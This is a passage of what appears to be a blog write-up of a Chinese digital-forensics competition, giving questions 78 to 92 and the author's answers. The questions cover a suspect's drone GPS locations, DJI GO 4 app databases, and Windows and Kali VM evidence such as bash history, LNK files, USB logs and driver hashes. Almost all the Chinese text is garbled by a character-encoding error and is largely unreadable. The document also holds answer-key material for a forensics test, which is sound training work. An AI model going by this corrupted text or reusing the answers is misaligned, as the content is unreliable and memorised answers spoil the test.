href="#78-å•é€‰é¢˜-å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥15-07-51æ—¶ä¹‹é—´æ‰€åœ¨çš„åœ°ç‚¹æ˜¯ä»€ä¹ˆ-1åˆ†" class="headerlink" title="78. [å•é€‰é¢˜] å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥15:07:51æ—¶ä¹‹é—´æ‰€åœ¨çš„åœ°ç‚¹æ˜¯ä»€ä¹ˆ? (1åˆ†)"></a>78. [å•é€‰é¢˜] å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥15:07:51æ—¶ä¹‹é—´æ‰€åœ¨çš„åœ°ç‚¹æ˜¯ä»€ä¹ˆ? (1åˆ†)</h3><p>A. 22.269299, 114.200486</p><p>B. 22.269353, 114.287267</p><p>C. 22.346855, 114.289552</p><p>D. 22.269293, 114.201278<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-194645524.png" class=""><br>Dä¸å…¶æœ€æ¥è¿‘</p><h3 id="79-å¡«ç©ºé¢˜-å¸¸å¨çš„æ— äººæœºå“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰æœ€åé™è½æ—¶é—´çš„æ•°æ®-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-ä¸ç”¨è¾“å…¥â€-â€-ï¼Ÿ-1åˆ†"><a href="#79-å¡«ç©ºé¢˜-å¸¸å¨çš„æ— äººæœºå“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰æœ€åé™è½æ—¶é—´çš„æ•°æ®-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-ä¸ç”¨è¾“å…¥â€-â€-ï¼Ÿ-1åˆ†" class="headerlink" title="79. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ— äººæœºå“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰æœ€åé™è½æ—¶é—´çš„æ•°æ®(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”,ä¸ç”¨è¾“å…¥â€.â€)ï¼Ÿ (1åˆ†)"></a>79. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ— äººæœºå“ªä¸€ä¸ªæ¡£æ¡ˆæœ‰æœ€åé™è½æ—¶é—´çš„æ•°æ®(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”,ä¸ç”¨è¾“å…¥â€.â€)ï¼Ÿ (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-195424620.png" class="">  <p>ä¸€æ · FLY096</p><h2 id="æ‰‹æœº-2"><a href="#æ‰‹æœº-2" class="headerlink" title="æ‰‹æœº"></a>æ‰‹æœº</h2><h3 id="80-å¤šé€‰é¢˜-å¸¸å¨çš„æ‰‹æœºä¸­å“ªä¸€ä¸ªæ˜¯ç”±å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥æ‰€æ‹æ‘„çš„å›¾åƒæ–‡ä»¶-2åˆ†"><a href="#80-å¤šé€‰é¢˜-å¸¸å¨çš„æ‰‹æœºä¸­å“ªä¸€ä¸ªæ˜¯ç”±å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥æ‰€æ‹æ‘„çš„å›¾åƒæ–‡ä»¶-2åˆ†" class="headerlink" title="80. [å¤šé€‰é¢˜] å¸¸å¨çš„æ‰‹æœºä¸­å“ªä¸€ä¸ªæ˜¯ç”±å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥æ‰€æ‹æ‘„çš„å›¾åƒæ–‡ä»¶? (2åˆ†)"></a>80. [å¤šé€‰é¢˜] å¸¸å¨çš„æ‰‹æœºä¸­å“ªä¸€ä¸ªæ˜¯ç”±å¸¸å¨çš„æ— äººæœºäº2021å¹´10æœˆ11æ—¥æ‰€æ‹æ‘„çš„å›¾åƒæ–‡ä»¶? (2åˆ†)</h3><p>A. Containers è´§æŸœ</p><p>B. Buildings å¤§å¦</p><p>C. bicycle å•è½¦</p><p>D. Mountain å±±<br>é€šè¿‡ä½ç½®çš„æ–‡ä»¶å®šä½åˆ°æ— äººæœºçš„æ–‡ä»¶ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°ç…§ç‰‡<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-201132133.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-201258971.png" class="">  </p><p>æœ‰å±±ï¼Œæœ‰å¤§å¦ï¼Œæœ‰è´§æŸœ</p><h3 id="81-å¡«ç©ºé¢˜-å¸¸å¨çš„æ‰‹æœºä¸­æ˜¾ç¤ºå¸¸å¨çš„æ— äººæœºDJI-GO-4çš„ç‰ˆæœ¬æ˜¯4-3-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#81-å¡«ç©ºé¢˜-å¸¸å¨çš„æ‰‹æœºä¸­æ˜¾ç¤ºå¸¸å¨çš„æ— äººæœºDJI-GO-4çš„ç‰ˆæœ¬æ˜¯4-3-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="81. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ‰‹æœºä¸­æ˜¾ç¤ºå¸¸å¨çš„æ— äººæœºDJI GO 4çš„ç‰ˆæœ¬æ˜¯4.3._?(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>81. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ‰‹æœºä¸­æ˜¾ç¤ºå¸¸å¨çš„æ— äººæœºDJI GO 4çš„ç‰ˆæœ¬æ˜¯4.3.<em>_</em>?(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-202110826.png" class="">  <h3 id="82-å¤šé€‰é¢˜-å¸¸å¨çš„æ‰‹æœºä¸­æ‰€å®‰è£…çš„DJI-GO-4-è½¯ä»¶ä¸­ï¼Œä»¥ä¸‹å“ªä¸ªdatabaseæ²¡æœ‰æ˜¾ç¤ºä¸´æ—¶ç¦é£åŒº-2åˆ†"><a href="#82-å¤šé€‰é¢˜-å¸¸å¨çš„æ‰‹æœºä¸­æ‰€å®‰è£…çš„DJI-GO-4-è½¯ä»¶ä¸­ï¼Œä»¥ä¸‹å“ªä¸ªdatabaseæ²¡æœ‰æ˜¾ç¤ºä¸´æ—¶ç¦é£åŒº-2åˆ†" class="headerlink" title="82. [å¤šé€‰é¢˜] å¸¸å¨çš„æ‰‹æœºä¸­æ‰€å®‰è£…çš„DJI GO 4 è½¯ä»¶ä¸­ï¼Œä»¥ä¸‹å“ªä¸ªdatabaseæ²¡æœ‰æ˜¾ç¤ºä¸´æ—¶ç¦é£åŒº? (2åˆ†)"></a>82. [å¤šé€‰é¢˜] å¸¸å¨çš„æ‰‹æœºä¸­æ‰€å®‰è£…çš„DJI GO 4 è½¯ä»¶ä¸­ï¼Œä»¥ä¸‹å“ªä¸ªdatabaseæ²¡æœ‰æ˜¾ç¤ºä¸´æ—¶ç¦é£åŒº? (2åˆ†)</h3><p>A. Filesflysafe_app.db</p><p>B. Special_warning.db</p><p>C. Flysafe_app_dynamic_areas.db</p><p>D. Flysafe_polygon_1860.db<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-202558938.png" class="">  </p><p>ABDä¸€ä¸ªä¸ªçœ‹è¿‡å»åªè¦Cæœ‰æ˜¾ç¤º</p><h3 id="83-å¡«ç©ºé¢˜-å¸¸å¨çš„æ‰‹æœºä¸­åœ¨-dbå¯çŸ¥é“DJI-GO-4-çš„ç™»å…¥ç”µå­é‚®ä»¶-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#83-å¡«ç©ºé¢˜-å¸¸å¨çš„æ‰‹æœºä¸­åœ¨-dbå¯çŸ¥é“DJI-GO-4-çš„ç™»å…¥ç”µå­é‚®ä»¶-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="83. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ‰‹æœºä¸­åœ¨__.dbå¯çŸ¥é“DJI GO 4 çš„ç™»å…¥ç”µå­é‚®ä»¶(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>83. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ‰‹æœºä¸­åœ¨<strong><strong>__</strong></strong>.dbå¯çŸ¥é“DJI GO 4 çš„ç™»å…¥ç”µå­é‚®ä»¶(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-203433462.png" class="">  <p>æŠŠæºæ–‡ä»¶çš„ä¸¤ä¸ªè·¯å¾„éƒ½çœ‹ä¸€ä¸‹<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-203738711.png" class=""><br>æœ€ç»ˆåœ¨localappstate</p><h3 id="84-å¡«ç©ºé¢˜-å¸¸å¨çš„æ‰‹æœºä¸­åœ¨-dbåŒ…å«äº†åä¸ºserver-timestamp-çš„èµ„æ–™-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#84-å¡«ç©ºé¢˜-å¸¸å¨çš„æ‰‹æœºä¸­åœ¨-dbåŒ…å«äº†åä¸ºserver-timestamp-çš„èµ„æ–™-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="84. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ‰‹æœºä¸­åœ¨__.dbåŒ…å«äº†åä¸ºserver_timestamp çš„èµ„æ–™(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>84. [å¡«ç©ºé¢˜] å¸¸å¨çš„æ‰‹æœºä¸­åœ¨<strong><strong>__</strong></strong>.dbåŒ…å«äº†åä¸ºserver_timestamp çš„èµ„æ–™(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><p>flysafe_app_dynamic_areas.db<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-202834627.png" class="">  </p><h2 id="windowsè®¡ç®—æœº"><a href="#windowsè®¡ç®—æœº" class="headerlink" title="windowsè®¡ç®—æœº"></a>windowsè®¡ç®—æœº</h2><h3 id="85-å•é€‰é¢˜-å¸¸å¨åˆ©ç”¨Windows-è®¡ç®—æœºä¸­çš„VM-Kaliè¿›è¡Œæ”»å‡»å’Œæ”¶å–å—å®³äººç”µè¯çš„æ•°æ®ï¼Œè¯·æ‰¾å‡ºå¸¸å¨çš„VMå­˜æ”¾åœ°å€-2åˆ†"><a href="#85-å•é€‰é¢˜-å¸¸å¨åˆ©ç”¨Windows-è®¡ç®—æœºä¸­çš„VM-Kaliè¿›è¡Œæ”»å‡»å’Œæ”¶å–å—å®³äººç”µè¯çš„æ•°æ®ï¼Œè¯·æ‰¾å‡ºå¸¸å¨çš„VMå­˜æ”¾åœ°å€-2åˆ†" class="headerlink" title="85. [å•é€‰é¢˜] å¸¸å¨åˆ©ç”¨Windows è®¡ç®—æœºä¸­çš„VM Kaliè¿›è¡Œæ”»å‡»å’Œæ”¶å–å—å®³äººç”µè¯çš„æ•°æ®ï¼Œè¯·æ‰¾å‡ºå¸¸å¨çš„VMå­˜æ”¾åœ°å€ (2åˆ†)"></a>85. [å•é€‰é¢˜] å¸¸å¨åˆ©ç”¨Windows è®¡ç®—æœºä¸­çš„VM Kaliè¿›è¡Œæ”»å‡»å’Œæ”¶å–å—å®³äººç”µè¯çš„æ•°æ®ï¼Œè¯·æ‰¾å‡ºå¸¸å¨çš„VMå­˜æ”¾åœ°å€ (2åˆ†)</h3><p>A. Users\Chris Paul\Desktop\å®‰å…¨é˜²æŠ¤ Malware\Kali-Linux-2020.2a-amd64_2.vmwarevm</p><p>B. \Users\Chris Paul\Desktop\å®‰å…¨é˜²æŠ¤ Malware Demo\Kali-Linux-2020.2a-amd64_2.vmwarevm</p><p>C. \Users\Chris Paul\Documents\å®‰å…¨é˜²æŠ¤ Malware \Kali-Linux-2020.2a-amd64_2.vmwarevm</p><p>D. \Users\Chris Paul\Documents\Virtual Machines<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-210732421.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-210752647.png" class=""><br>A</p><h3 id="86-å•é€‰é¢˜-å¸¸å¨åœ¨æ”¶é›†æ•°æ®åå‚¨å­˜æ•°æ®äºWindows-è®¡ç®—æœºä¸€ä¸ªåä¸ºâ€text2-txtâ€çš„æ¡£æ¡ˆä¸­ï¼Œéšåä»–å°†æ¡£æ¡ˆç§»å¾€â€-home-kali-Desktop-project-â€ä¸­-ä¸‹è¿°å“ªä¸ªæ¡£æ¡ˆå¯ä»¥è¯æ˜è¿™ä¸€ç‚¹-i-root-bash-history-ii-home-kali-bash-history-3åˆ†"><a href="#86-å•é€‰é¢˜-å¸¸å¨åœ¨æ”¶é›†æ•°æ®åå‚¨å­˜æ•°æ®äºWindows-è®¡ç®—æœºä¸€ä¸ªåä¸ºâ€text2-txtâ€çš„æ¡£æ¡ˆä¸­ï¼Œéšåä»–å°†æ¡£æ¡ˆç§»å¾€â€-home-kali-Desktop-project-â€ä¸­-ä¸‹è¿°å“ªä¸ªæ¡£æ¡ˆå¯ä»¥è¯æ˜è¿™ä¸€ç‚¹-i-root-bash-history-ii-home-kali-bash-history-3åˆ†" class="headerlink" title="86. [å•é€‰é¢˜] å¸¸å¨åœ¨æ”¶é›†æ•°æ®åå‚¨å­˜æ•°æ®äºWindows è®¡ç®—æœºä¸€ä¸ªåä¸ºâ€text2.txtâ€çš„æ¡£æ¡ˆä¸­ï¼Œéšåä»–å°†æ¡£æ¡ˆç§»å¾€â€\home\kali\Desktop\project\â€ä¸­, ä¸‹è¿°å“ªä¸ªæ¡£æ¡ˆå¯ä»¥è¯æ˜è¿™ä¸€ç‚¹? i) \root.bash_history ii) \home\kali.bash_history (3åˆ†)"></a>86. [å•é€‰é¢˜] å¸¸å¨åœ¨æ”¶é›†æ•°æ®åå‚¨å­˜æ•°æ®äºWindows è®¡ç®—æœºä¸€ä¸ªåä¸ºâ€text2.txtâ€çš„æ¡£æ¡ˆä¸­ï¼Œéšåä»–å°†æ¡£æ¡ˆç§»å¾€â€\home\kali\Desktop\project\â€ä¸­, ä¸‹è¿°å“ªä¸ªæ¡£æ¡ˆå¯ä»¥è¯æ˜è¿™ä¸€ç‚¹? i) \root.bash_history ii) \home\kali.bash_history (3åˆ†)</h3><p>A. åªæœ‰ i</p><p>B. åªæœ‰ii</p><p>C. ä¸¤ä¸ªä¹Ÿå¯ä»¥</p><p>D. ä¸¤ä¸ªä¹Ÿä¸å¯ä»¥<br>æ‰¾åˆ°è™šæ‹Ÿæœºçš„vmdkæ–‡ä»¶ï¼Œéšä¾¿å³å‡»ä¸€ä¸ªï¼Œè™šæ‹Ÿç¡¬ç›˜è§£æå³å¯å¾—åˆ°kaliçš„å–è¯æ–‡ä»¶<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-221051590.png" class="">  </p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-215441614.png" class="">  <p>é¦–å…ˆä¸Šé¢çš„ä¸¤ä¸ªéƒ½æ˜¯liunxçš„bashå‘½ä»¤å†å²ï¼Œè€Œå¦‚æœwindowså°†æ–‡ä»¶å¤åˆ¶åˆ°è™šæ‹Ÿæœºé‡Œå¹¶ä¸ä¼šäº§ç”Ÿbashå‘½ä»¤ã€‚<br>æŸ¥çœ‹å‘½ä»¤è®°å½•ä¼šå‘ç°ï¼Œè™½ç„¶å‡ºç°test2.txtä½†æ˜¯å…¶æ“ä½œä¸ºå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå†™å…¥å…¶ä¸­<br>D</p><h3 id="87-å•é€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºä¸­å“ªä¸€ä¸ªç¨‹å¼-æ¡£æ¡ˆæœ‰å¯èƒ½ç”¨ä½œæ”¶å–å—å®³äººç”µè¯ä¸Šçš„æ•°æ®-3åˆ†"><a href="#87-å•é€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºä¸­å“ªä¸€ä¸ªç¨‹å¼-æ¡£æ¡ˆæœ‰å¯èƒ½ç”¨ä½œæ”¶å–å—å®³äººç”µè¯ä¸Šçš„æ•°æ®-3åˆ†" class="headerlink" title="87. [å•é€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºä¸­å“ªä¸€ä¸ªç¨‹å¼/æ¡£æ¡ˆæœ‰å¯èƒ½ç”¨ä½œæ”¶å–å—å®³äººç”µè¯ä¸Šçš„æ•°æ®? (3åˆ†)"></a>87. [å•é€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºä¸­å“ªä¸€ä¸ªç¨‹å¼/æ¡£æ¡ˆæœ‰å¯èƒ½ç”¨ä½œæ”¶å–å—å®³äººç”µè¯ä¸Šçš„æ•°æ®? (3åˆ†)</h3><p>A. \home\kali\Desktop\server_express_ok.js</p><p>B. \home\kali\Desktop\baddish\package.json</p><p>C. \home\kali\Desktop\baddish\server.js</p><p>D. \home\kali\Desktop\server.js<br>ä»å†å²å‘½ä»¤å¯ä»¥çœ‹å‡ºæ¥å…¶å°†server.jså¤åˆ¶åˆ°\home\kali\Desktop\baddishç„¶åæ‰§è¡Œå°†æ‰§è¡Œç»“æœè¾“å…¥åˆ°test.txt<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-215441614.png" class="">  </p><p>A</p><h3 id="88-å¤šé€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºä¸­æ˜¾ç¤ºå¸¸å¨ç¬¬ä¸€æ¬¡å·å–å—å®³äººç”µè¯æ•°æ®æœ‰æœºä¼šæ˜¯åœ¨å“ªä¸€ä¸ªæ—¥å­åŠæ—¶é—´ç™»å…¥-Kali-ç³»ç»Ÿ-2åˆ†"><a href="#88-å¤šé€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºä¸­æ˜¾ç¤ºå¸¸å¨ç¬¬ä¸€æ¬¡å·å–å—å®³äººç”µè¯æ•°æ®æœ‰æœºä¼šæ˜¯åœ¨å“ªä¸€ä¸ªæ—¥å­åŠæ—¶é—´ç™»å…¥-Kali-ç³»ç»Ÿ-2åˆ†" class="headerlink" title="88. [å¤šé€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºä¸­æ˜¾ç¤ºå¸¸å¨ç¬¬ä¸€æ¬¡å·å–å—å®³äººç”µè¯æ•°æ®æœ‰æœºä¼šæ˜¯åœ¨å“ªä¸€ä¸ªæ—¥å­åŠæ—¶é—´ç™»å…¥ Kali ç³»ç»Ÿ? (2åˆ†)"></a>88. [å¤šé€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºä¸­æ˜¾ç¤ºå¸¸å¨ç¬¬ä¸€æ¬¡å·å–å—å®³äººç”µè¯æ•°æ®æœ‰æœºä¼šæ˜¯åœ¨å“ªä¸€ä¸ªæ—¥å­åŠæ—¶é—´ç™»å…¥ Kali ç³»ç»Ÿ? (2åˆ†)</h3><p>A. 2021-09-27</p><p>B. 2021-09-29</p><p>C. 2021-09-29</p><p>D. 11:42:47</p><p>E. 16:04:24</p><p>F. 16:30:04<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-222100987.png" class=""><br>åœ¨win10æ—¶é—´è½´é‡Œå¯ä»¥çœ‹åˆ°æ‰“å¼€è™šæ‹Ÿæœºçš„æ—¶é—´ï¼Œè€Œåªæœ‰24å’Œ27å·æœ‰æ‰“å¼€è™šæ‹Ÿæœºï¼Œå³æ—¶é—´ä¸º27å·è€Œæ‰“å¼€è™šæ‹Ÿæœºçš„æ—¶é—´æ®µå†…çš„åªæœ‰16.30å³é€‰AF</p><h3 id="89-å¤šé€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸€ä¸ªæª”æ¡ˆçš„å“ˆå¸Œå€¼-MD5-èƒ½è¯æ˜å¸¸å¨æ›¾å¼€å¯å­˜æœ‰å®¢æˆ·æ•°æ®çš„æ¡£æ¡ˆ-2åˆ†"><a href="#89-å¤šé€‰é¢˜-å¸¸å¨Windowsè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸€ä¸ªæª”æ¡ˆçš„å“ˆå¸Œå€¼-MD5-èƒ½è¯æ˜å¸¸å¨æ›¾å¼€å¯å­˜æœ‰å®¢æˆ·æ•°æ®çš„æ¡£æ¡ˆ-2åˆ†" class="headerlink" title="89. [å¤šé€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸€ä¸ªæª”æ¡ˆçš„å“ˆå¸Œå€¼(MD5)èƒ½è¯æ˜å¸¸å¨æ›¾å¼€å¯å­˜æœ‰å®¢æˆ·æ•°æ®çš„æ¡£æ¡ˆ? (2åˆ†)"></a>89. [å¤šé€‰é¢˜] å¸¸å¨Windowsè®¡ç®—æœºä¸­ä»¥ä¸‹å“ªä¸€ä¸ªæª”æ¡ˆçš„å“ˆå¸Œå€¼(MD5)èƒ½è¯æ˜å¸¸å¨æ›¾å¼€å¯å­˜æœ‰å®¢æˆ·æ•°æ®çš„æ¡£æ¡ˆ? (2åˆ†)</h3><p>A. 0ED1DB00F8598AD3C6B331BF0C477AD4</p><p>B. 1E1BDB083F66251A63B79DEA3801E6E9</p><p>C. 575326396E31040FE2E13BE42C55C3E2</p><p>D. 3128604B4A9EC1D37418942555F6B08A</p><p>E. FB5EF33EDEA8ECB5BF07C5DF5332D29F<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-223732638.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-223948694.png" class=""><br>æœç´¢å®¢æˆ·èµ„æ–™å¯ä»¥æ‰¾åˆ°lnkæ–‡ä»¶<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224427948.png" class="">  </p><p>AC</p><h3 id="90-å•é€‰é¢˜-å¸¸å¨-Windows-è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆå¯ä»¥æ‰¾åˆ°USBè£…ç½®åˆæ¬¡è¿æ¥çš„æ—¶é—´-1åˆ†"><a href="#90-å•é€‰é¢˜-å¸¸å¨-Windows-è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆå¯ä»¥æ‰¾åˆ°USBè£…ç½®åˆæ¬¡è¿æ¥çš„æ—¶é—´-1åˆ†" class="headerlink" title="90. [å•é€‰é¢˜] å¸¸å¨ Windows è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆå¯ä»¥æ‰¾åˆ°USBè£…ç½®åˆæ¬¡è¿æ¥çš„æ—¶é—´? (1åˆ†)"></a>90. [å•é€‰é¢˜] å¸¸å¨ Windows è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ¡£æ¡ˆå¯ä»¥æ‰¾åˆ°USBè£…ç½®åˆæ¬¡è¿æ¥çš„æ—¶é—´? (1åˆ†)</h3><p>A. C:\Windows\setupapi.log</p><p>B. C:\Windows\setupapi.setup.log</p><p>C. C:\Windows\INF\setupapi.setup.log</p><p>D. C:\Windows\INF\setupapi.dev.log<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224623793.png" class="">  </p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224606351.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-224537058.png" class="">  <p>é€‰C</p><h3 id="91-å•é€‰é¢˜-å¸¸å¨-Windows-è®¡ç®—æœºæ¥é©³äº†ä¸€ä¸ª3D-æ‰“å°æœºï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå“ˆå¸Œå€¼æ˜¯å±äºä¸Šè¿°æ‰“å°æœºçš„é©±åŠ¨ç¨‹å¼æ–‡ä»¶ä¸­çš„å®‰è£…ä¿¡æ¯æ–‡ä»¶-INFæª”-æç¤ºï¼šå…³é”®è¯åŒ…å«CH341-3åˆ†"><a href="#91-å•é€‰é¢˜-å¸¸å¨-Windows-è®¡ç®—æœºæ¥é©³äº†ä¸€ä¸ª3D-æ‰“å°æœºï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå“ˆå¸Œå€¼æ˜¯å±äºä¸Šè¿°æ‰“å°æœºçš„é©±åŠ¨ç¨‹å¼æ–‡ä»¶ä¸­çš„å®‰è£…ä¿¡æ¯æ–‡ä»¶-INFæª”-æç¤ºï¼šå…³é”®è¯åŒ…å«CH341-3åˆ†" class="headerlink" title="91. [å•é€‰é¢˜] å¸¸å¨ Windows è®¡ç®—æœºæ¥é©³äº†ä¸€ä¸ª3D æ‰“å°æœºï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå“ˆå¸Œå€¼æ˜¯å±äºä¸Šè¿°æ‰“å°æœºçš„é©±åŠ¨ç¨‹å¼æ–‡ä»¶ä¸­çš„å®‰è£…ä¿¡æ¯æ–‡ä»¶(INFæª”)? (æç¤ºï¼šå…³é”®è¯åŒ…å«CH341) (3åˆ†)"></a>91. [å•é€‰é¢˜] å¸¸å¨ Windows è®¡ç®—æœºæ¥é©³äº†ä¸€ä¸ª3D æ‰“å°æœºï¼Œä»¥ä¸‹å“ªä¸€ä¸ªå“ˆå¸Œå€¼æ˜¯å±äºä¸Šè¿°æ‰“å°æœºçš„é©±åŠ¨ç¨‹å¼æ–‡ä»¶ä¸­çš„å®‰è£…ä¿¡æ¯æ–‡ä»¶(INFæª”)? (æç¤ºï¼šå…³é”®è¯åŒ…å«CH341) (3åˆ†)</h3><p>A. 1348FA38956<strong>*</strong>1770D7C3E63545BC</p><p>B. DBC4F08F835<strong>*</strong>FF95420B352B506A</p><p>C. 35E7C67A652<strong>*</strong>611EDE19C37241C5</p><p>D. BAE3BE76CC1<strong>*</strong>31EB562ABAFE28DE<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-225023454.png" class="">  </p><h3 id="92-å¡«ç©ºé¢˜-ç»­ä¸Šé¢˜ï¼Œä¸Šè¿°å®‰è£…ä¿¡æ¯æ–‡ä»¶çš„ç‰ˆæœ¬æ—¥æœŸæ˜¯ä»€ä¹ˆ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ï¼ŒåŠä»¥ä¸‹æ ¼å¼å›ç­”ï¼Œä¾‹-2019å¹´3æœˆ4æ—¥ï¼Œè¯·å›ç­”20190304-1åˆ†"><a href="#92-å¡«ç©ºé¢˜-ç»­ä¸Šé¢˜ï¼Œä¸Šè¿°å®‰è£…ä¿¡æ¯æ–‡ä»¶çš„ç‰ˆæœ¬æ—¥æœŸæ˜¯ä»€ä¹ˆ-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ï¼ŒåŠä»¥ä¸‹æ ¼å¼å›ç­”ï¼Œä¾‹-2019å¹´3æœˆ4æ—¥ï¼Œè¯·å›ç­”20190304-1åˆ†" class="headerlink" title="92. [å¡«ç©ºé¢˜] ç»­ä¸Šé¢˜ï¼Œä¸Šè¿°å®‰è£…ä¿¡æ¯æ–‡ä»¶çš„ç‰ˆæœ¬æ—¥æœŸæ˜¯ä»€ä¹ˆ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ï¼ŒåŠä»¥ä¸‹æ ¼å¼å›ç­”ï¼Œä¾‹: 2019å¹´3æœˆ4æ—¥ï¼Œè¯·å›ç­”20190304) (1åˆ†)"></a>92. [å¡«ç©ºé¢˜] ç»­ä¸Šé¢˜ï¼Œä¸Šè¿°å®‰è£…ä¿¡æ¯æ–‡ä»¶çš„ç‰ˆæœ¬æ—¥æœŸæ˜¯ä»€ä¹ˆ? 